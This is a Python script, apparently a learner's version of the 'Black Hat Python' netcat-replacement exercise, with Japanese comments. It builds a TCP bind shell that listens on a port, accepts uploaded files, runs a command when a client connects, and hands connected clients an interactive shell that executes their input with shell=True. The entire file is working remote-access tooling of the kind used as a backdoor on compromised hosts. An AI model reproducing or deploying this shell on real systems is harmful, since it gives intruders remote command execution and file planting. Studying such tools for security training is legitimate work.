#!/usr/bin/python

import sys
import socket
import argparse
import threading
import subprocess


def main():

    # オプションパース
    parser = argparse.ArgumentParser(description='BlackHatPython Net Tool')
    parser.add_argument('-l', '--listen', action='store_true', help='- listen on [host]:[port] for incoming connections')
    parser.add_argument('-e', '--execute', metavar='CMD', help='- execute the given file upon receiving a connection')
    parser.add_argument('-c', '--command', action='store_true', help='- initialize a command shell')
    parser.add_argument('-u', '--upload', metavar='DST', help='- upon receiving connection upload a file and write to [destination]')
    parser.add_argument('-t', '--target', metavar='HOST', help='- target host')
    parser.add_argument('-p', '--port', type=int, help='- target port')
    parser.add_argument('-v', '--version', action='version', version=0.1)
    args = parser.parse_args()

    if len(sys.argv[1:]) == 0:
        parser.print_help()

    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    listen = args.listen
    port = args.port
    execute = args.execute
    command = args.command
    upload_destination = args.upload
    target = args.target

    # 接続を待機する？標準入力からデータを受け取って送信する？
    if not listen and target and port > 0:
        # コマンドラインからの入力をbufferに格納する
        # 入力が来ないと処理が継続されないので標準入力にデータを送らない場合は^Dを入力する
        buffer = sys.stdin.read()

        # データ送信
        client_sender(buffer)

    # 接続待機を開始
    # オプションに応じてファイルアップロード/コマンド実行/コマンドシェルの実行を行う
    if listen:
        server_loop()


def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # targetホストへの接続
        client.connect((target, port))
        print("Connected to Host!\n")

        if len(buffer):
            client.send(buffer.encode('utf-8'))

        while True:
            # targetホストはからのデータを待機
            recv_len = 1
            responce = b""

            while recv_len:
                print("recv_len: {}".format(recv_len))
                data = client.recv(4096)
                recv_len = len(data)
                responce += data

                if recv_len < 4096:
                    break

            print(responce.decode('utf-8'))

            # 追加の入力を待機
            buff = input().encode('utf-8')
            buff += b"\n"

            # データの送信
            client.send(buff)

    except Exception as e:
        print("[*] Exception! Exiting.", e)

    # 接続の終了
    client.close()


def server_loop():
    global target

    # 待機するIPアドレスが指定されていない場合は全てのインターフェースで接続を待機
    if target is None:
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        print("Connected to Client!\n")

        # クライアントからの新しい接続を処理するスレッドの起動
        client_thread = threading.Thread(
            target=client_handler, args=(client_socket,)
        )
        client_thread.start()


def run_command(command):
    # 文字列の末尾の改行を削除a
    command = command.rstrip()

    # コマンドを実行し出力結果を取得
    try:
        output = subprocess.check_output(
            command,stderr=subprocess.STDOUT, shell=True
        )
    except:
        output = b"Failed to execute command.\r\n"

    # 出力結果をクライアントに送信
    return output

def client_handler(client_socket):
    global execute
    global command

    # ファイルアップロードを指定されているかどうかの確認
    if upload_destination is not None:

        # 全てのデータを読み取り、指定されたファイルにデータ書き込み
        file_buffer = b""

        # 受信データがなくなるまでデータ受信を継続
        while True:
            data = client_socket.recv(1024)

            if len(data) == 0:
                break
            else:
                file_buffer += data

        # 受信したデータをファイルに書き込み
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            client_socket.send(
                b"Successfully saved file to %s\r\n" % upload_destination
            )
        except:
            client_socket.send(
                b"Failed to save file to %s\r\n" % upload_destination
            )

    # コマンド実行を指定されているかどうかの確認
    if execute is not None:

        # コマンドの実行
        output = run_command(execute)

        client_socket.send(output)

    # コマンドシェルの実行を指定されている場合の処理
    if command:

        # プロンプトの表示
        prompt = b"<BHP:#> "
        client_socket.send(prompt)

        while True:

            # 改行を受け取るまでデータを受信
            cmd_buffer = b""
            while b"\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # コマンドの実行結果を取得
            response = run_command(cmd_buffer)
            response += prompt

            # コマンドの実行結果を送信
            client_socket.send(response)

if __name__ == '__main__':
    main()